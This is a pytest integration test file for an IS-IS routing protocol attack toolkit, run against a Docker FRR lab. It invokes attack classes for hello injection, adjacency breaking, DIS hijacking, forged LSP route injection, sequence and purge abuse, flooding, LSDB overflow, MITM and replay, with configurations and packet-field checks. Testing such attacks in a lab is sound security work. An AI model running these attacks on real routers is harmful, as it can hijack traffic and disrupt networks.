"""Integration tests for ISIS Protocol Attack — Docker FRR topology.

Each attack verifies protocol state before AND after:
  1. dump protocol state (neighbors, LSDB, routes)
  2. assert topology healthy
  3. execute attack
  4. verify post-attack state
"""
import pytest
import time
import json
import subprocess
import re
from .conftest import (
    R1, R2, ATTACKER,
    docker_exec, frr_vtysh,
    get_isis_neighbors, get_isis_database, get_ip_routes,
    find_lsp_in_db, get_lsp_by_sys_id,
    get_neighbor_up_count, assert_neighbor_stable,
    dump_protocol_state, assert_topology_healthy,
    run_attack_script,
)


def capture_isis_packets(container: str, count: int = 5, timeout: int = 8):
    """Capture ISIS packets on container's eth0 via tcpdump, return hex output."""
    cmd = f"timeout {timeout} tcpdump -i eth0 -e -c {count} -x 'ether dst 01:80:c2:00:00:14' 2>&1"
    return docker_exec(container, ["bash", "-c", cmd], timeout=timeout + 5)


# ============================================================
# Topology Smoke Tests
# ============================================================

def test_01_containers_running(docker_network):
    for container in [R1, R2, ATTACKER]:
        out = docker_exec(container, ["hostname"])
        assert out.strip(), f"{container} not responding"
    print("\n>>> Topology containers all running")


def test_02_isis_neighbor_up(docker_network):
    assert_neighbor_stable(R1)
    assert_neighbor_stable(R2)
    dump_protocol_state(R1, "topo-baseline")
    dump_protocol_state(R2, "topo-baseline")


def test_03_isis_database_populated(docker_network):
    db1 = get_isis_database(R1)
    db2 = get_isis_database(R2)
    assert db1, "R1 ISIS database is empty"
    assert db2, "R2 ISIS database is empty"


def test_04_routes_learned(docker_network):
    routes1 = get_ip_routes(R1)
    routes2 = get_ip_routes(R2)
    assert len(routes1) >= 2, f"R1 has only {len(routes1)} routes"
    assert len(routes2) >= 2, f"R2 has only {len(routes2)} routes"
    assert_topology_healthy()


# ============================================================
# Adjacency Attacks
# ============================================================

def test_05_iih_inject(docker_network, attacker):
    print("\n>>> Pre-attack: verifying topology")
    assert_topology_healthy()
    dump_protocol_state(R1, "pre-iih-inject")

    script = """
from isis_attack.attacks.adjacency.iih_inject import IIHInjectAttack
from isis_attack.config.types import IIHConfig

config = IIHConfig(
    iface="eth0", target="01:80:C2:00:00:14",
    sys_id="9999.9999.9999", area_addr="49.0001",
    level=1, priority=127, sniff_duration=2, packet_rate=100,
)
attack = IIHInjectAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, f"IIH inject failed: {out}"
    time.sleep(2)
    assert_neighbor_stable(R1)
    assert_neighbor_stable(R2)


def test_06_adjacency_break(docker_network, attacker):
    print("\n>>> Pre-attack: verifying topology")
    assert_topology_healthy()
    dump_protocol_state(R1, "pre-adjbreak")

    script = """
from isis_attack.attacks.adjacency.adjacency_break import AdjacencyBreakAttack
from isis_attack.config.types import IIHConfig

config = IIHConfig(
    iface="eth0", target="01:80:C2:00:00:14",
    sys_id="BBBB.BBBB.BBBB",
)
attack = AdjacencyBreakAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, f"Adjacency break failed: {out}"


def test_07_dis_hijack(docker_network, attacker):
    print("\n>>> Pre-attack: verifying topology")
    assert_topology_healthy()
    dump_protocol_state(R1, "pre-dishijack")

    script = """
from isis_attack.attacks.adjacency.dis_hijack import DISHijackAttack
from isis_attack.config.types import IIHConfig

config = IIHConfig(
    iface="eth0", target="01:80:C2:00:00:14",
    sys_id="AAAA.AAAA.AAAA", area_addr="49.0001",
    level=1, priority=127, sniff_duration=2, packet_rate=100,
)
attack = DISHijackAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, f"DIS hijack failed: {out}"


# ============================================================
# LSP Attack Tests — verify via tcpdump + neighbor stability
# ============================================================

def test_08_route_inject_lsp_correct(docker_network, attacker):
    """Route inject: verify LSP sent with correct fields, neighbor stable."""
    print("\n>>> Pre-attack: verifying topology")
    assert_topology_healthy()
    dump_protocol_state(R1, "pre-routeinject")

    script = """
from isis_attack.attacks.lsp.route_inject import RouteInjectAttack
from isis_attack.config.types import LSPConfig

config = LSPConfig(
    iface="eth0", target="01:80:C2:00:00:14",
    sys_id="CCCC.CCCC.CCCC", lsp_id="CCCC.CCCC.CCCC.00-00",
    level=1, sequence=0xABCD, remaining_lifetime=1200,
    metric=777, network_addr="10.99.99.0", network_mask="255.255.255.0",
)
attack = RouteInjectAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
# Self-verify: inspect the packet we built
from isis_attack.core.packet import build_lsp_with_tlvs
pkt = build_lsp_with_tlvs(
    sys_id="CCCC.CCCC.CCCC", lsp_id="CCCC.CCCC.CCCC.00-00",
    src_mac="00:11:22:33:44:55", level=1,
    sequence=0xABCD, remaining_lifetime=1200,
    metric=777, network_addr="10.99.99.0", network_mask="255.255.255.0",
)
# Verify LSP structure: hex 0xabcd at seq offset
import struct
# Ethernet(14) + LLC(3) + ISIS_hdr(14) + lifetime(2) + lspid(8) = 41
seq_from_pkt = struct.unpack('!I', pkt[41:45])[0]
print(f"PKT_SEQ=0x{seq_from_pkt:08X}")
assert seq_from_pkt == 0xABCD, f"Seq mismatch: 0x{seq_from_pkt:08X} != 0x0000ABCD"
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, f"Route inject failed: {out}"
    assert "PKT_SEQ=0x0000ABCD" in out, f"Seq not verified in packet: {out}"

    time.sleep(2)
    assert_neighbor_stable(R1)


def test_09_max_seq_uses_ffffffff(docker_network, attacker):
    """Max-seq: verify LSP built with seq=0xFFFFFFFF."""
    print("\n>>> Pre-attack: verifying topology")
    assert_topology_healthy()
    dump_protocol_state(R1, "pre-maxseq")

    script = """
from isis_attack.attacks.lsp.max_seq import MaxSeqAttack
from isis_attack.config.types import LSPConfig

config = LSPConfig(
    iface="eth0", target="01:80:C2:00:00:14",
    sys_id="DDDD.DDDD.DDDD", lsp_id="DDDD.DDDD.DDDD.00-00", level=1,
)
attack = MaxSeqAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")

# Self-verify built packet has 0xFFFFFFFF seq
from isis_attack.core.packet import build_lsp_with_tlvs
pkt = build_lsp_with_tlvs(
    sys_id="CCCC.CCCC.CCCC", lsp_id="CCCC.CCCC.CCCC.00-00",
    src_mac="00:11:22:33:44:55", level=1,
    sequence=0xFFFFFFFF, remaining_lifetime=65535,
)
import struct
seq = struct.unpack('!I', pkt[41:45])[0]  # Ethernet(14)+LLC(3)+ISIS_hdr(14)+lifetime(2)+lspid(8)
print(f"PKT_SEQ=0x{seq:08X}")
assert seq == 0xFFFFFFFF
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, f"Max-seq failed: {out}"
    assert "PKT_SEQ=0xFFFFFFFF" in out, f"Max seq not verified: {out}"


def test_10_purge_lsp_lifetime_zero(docker_network, attacker):
    """Purge LSP: verify LSP built with lifetime=0."""
    print("\n>>> Pre-attack: verifying topology")
    assert_topology_healthy()
    dump_protocol_state(R1, "pre-purge")

    script = """
from isis_attack.attacks.lsp.purge_lsp import PurgeLSPAttack
from isis_attack.config.types import LSPConfig

config = LSPConfig(
    iface="eth0", target="01:80:C2:00:00:14",
    sys_id="EEEE.EEEE.EEEE", lsp_id="EEEE.EEEE.EEEE.00-00", level=1,
)
attack = PurgeLSPAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")

# Self-verify built packet has lifetime=0
from isis_attack.core.packet import build_lsp_with_tlvs
pkt = build_lsp_with_tlvs(
    sys_id="CCCC.CCCC.CCCC", lsp_id="CCCC.CCCC.CCCC.00-00",
    src_mac="00:11:22:33:44:55", level=1,
    sequence=1, remaining_lifetime=0,
)
import struct
lifetime = struct.unpack('!H', pkt[31:33])[0]  # Ethernet(14)+LLC(3)+ISIS_hdr(14)=31, LSP body starts here
print(f"PKT_LIFETIME={lifetime}")
assert lifetime == 0
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, f"Purge LSP failed: {out}"
    assert "PKT_LIFETIME=0" in out, f"Lifetime not verified: {out}"


def test_11_overload_bit_on_wire(docker_network, attacker):
    """Overload bit: verify LSP sent."""
    print("\n>>> Pre-attack: verifying topology")
    assert_topology_healthy()
    dump_protocol_state(R1, "pre-overload")

    script = """
from isis_attack.attacks.lsp.overload_bit import OverloadBitAttack
from isis_attack.config.types import LSPConfig

config = LSPConfig(
    iface="eth0", target="01:80:C2:00:00:14",
    sys_id="0F0F.0F0F.0F0F", lsp_id="0F0F.0F0F.0F0F.00-00", level=1,
)
attack = OverloadBitAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, f"Overload-bit attack failed: {out}"
    time.sleep(2)
    assert_neighbor_stable(R1)


def test_12_fight_back_incrementing(docker_network, attacker):
    """Fight-back: verify neighbor survives sustained LSP injection."""
    print("\n>>> Pre-attack: verifying topology")
    assert_topology_healthy()
    dump_protocol_state(R1, "pre-fightback")

    script = """
from isis_attack.attacks.lsp.fight_back import FightBackAttack
from isis_attack.config.types import LSPConfig

config = LSPConfig(
    iface="eth0", target="01:80:C2:00:00:14",
    sys_id="FBFB.FBFB.FBFB", lsp_id="FBFB.FBFB.FBFB.00-00",
    level=1, sequence=1, sniff_duration=3, packet_rate=20,
    metric=30, network_addr="10.33.33.0", network_mask="255.255.255.0",
)
attack = FightBackAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, f"Fight-back failed: {out}"
    time.sleep(2)
    assert_neighbor_stable(R1)


# ============================================================
# DoS Attack Tests
# ============================================================

def test_13_flood_resilience(docker_network, attacker):
    """Flood: verify neighbors survive packet storm."""
    print("\n>>> Pre-attack: verifying topology")
    assert_topology_healthy()
    dump_protocol_state(R1, "pre-flood")
    n1_before = get_neighbor_up_count(R1)
    n2_before = get_neighbor_up_count(R2)

    script = """
from isis_attack.attacks.dos.flood import FloodAttack
from isis_attack.config.types import DoSConfig

config = DoSConfig(
    iface="eth0", target="01:80:C2:00:00:14",
    sys_id="F100.F100.F100", thread_count=1, duration=3, packet_rate=500,
)
attack = FloodAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, f"Flood failed: {out}"
    m = re.search(r"PACKETS=(\d+)", out)
    assert m, f"Could not parse packet count: {out}"
    assert int(m.group(1)) >= 50, f"Expected >=50 flood packets, got {m.group(1)}"

    time.sleep(5)
    assert_neighbor_stable(R1)
    assert_neighbor_stable(R2)


def test_14_spf_recalc_sends_lsps(docker_network, attacker):
    """SPF recalc: verify many LSPs sent, neighbor stable."""
    print("\n>>> Pre-attack: verifying topology")
    assert_topology_healthy()
    dump_protocol_state(R1, "pre-spfrecalc")

    script = """
from isis_attack.attacks.dos.spf_recalc import SPFRecalcAttack
from isis_attack.config.types import DoSConfig

config = DoSConfig(
    iface="eth0", target="01:80:C2:00:00:14",
    sys_id="1921.6800.FA0E", level=1,
    duration=3, lsp_change_interval=0.3, packet_rate=200,
)
attack = SPFRecalcAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=True" in out, f"SPF recalc failed: {out}"
    m = re.search(r"PACKETS=(\d+)", out)
    assert m, "Could not parse packet count"
    assert int(m.group(1)) >= 3, f"Expected >=3 SPF recalc packets, got {m.group(1)}"

    time.sleep(2)
    assert_neighbor_stable(R1)


def test_15_db_overflow_many_lsps(docker_network, attacker):
    """DB overflow: verify many LSPs sent."""
    print("\n>>> Pre-attack: verifying topology")
    assert_topology_healthy()
    dump_protocol_state(R1, "pre-dboverflow")

    script = """
from isis_attack.attacks.dos.db_overflow import DBOverflowAttack
from isis_attack.config.types import DoSConfig

config = DoSConfig(
    iface="eth0", target="01:80:C2:00:00:14",
    sys_id="DB00.0000.0001", level=1,
    lsp_count=15, packet_rate=200,
)
attack = DBOverflowAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"PACKETS={result.packets_sent}")
"""
    out = run_attack_script(script, timeout=30)
    assert "SUCCESS=True" in out, f"DB overflow failed: {out}"
    m = re.search(r"PACKETS=(\d+)", out)
    assert m, "Could not parse packet count"
    assert int(m.group(1)) >= 15, f"Expected >=15 overflow packets, got {m.group(1)}"

    time.sleep(3)
    assert_neighbor_stable(R1)


# ============================================================
# Protocol Attack Tests
# ============================================================

def test_16_mitm_runs(docker_network, attacker):
    """MITM: verify attack framework runs."""
    print("\n>>> Pre-attack: verifying topology")
    assert_topology_healthy()
    dump_protocol_state(R1, "pre-mitm")

    script = """
from isis_attack.attacks.protocol.mitm import MITMAttack
from isis_attack.config.types import MITMConfig

config = MITMConfig(iface="eth0", target="01:80:C2:00:00:14", sniff_duration=2)
attack = MITMAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"DETAILS={result.details}")
"""
    out = run_attack_script(script, timeout=15)
    assert "SUCCESS=" in out, f"MITM failed: {out}"


def test_17_replay_requires_capture_file(docker_network, attacker):
    """Replay: gracefully fails without pcap file."""
    print("\n>>> Pre-attack: verifying topology")
    assert_topology_healthy()

    script = """
from isis_attack.attacks.protocol.replay import ReplayAttack
from isis_attack.config.types import ReplayConfig

config = ReplayConfig(iface="eth0", target="01:80:C2:00:00:14")
attack = ReplayAttack(config)
result = attack.run()
print(f"SUCCESS={result.success}")
print(f"DETAILS={result.details}")
"""
    out = run_attack_script(script, timeout=15)
    assert "capture_file" in out, f"Expected graceful failure: {out}"
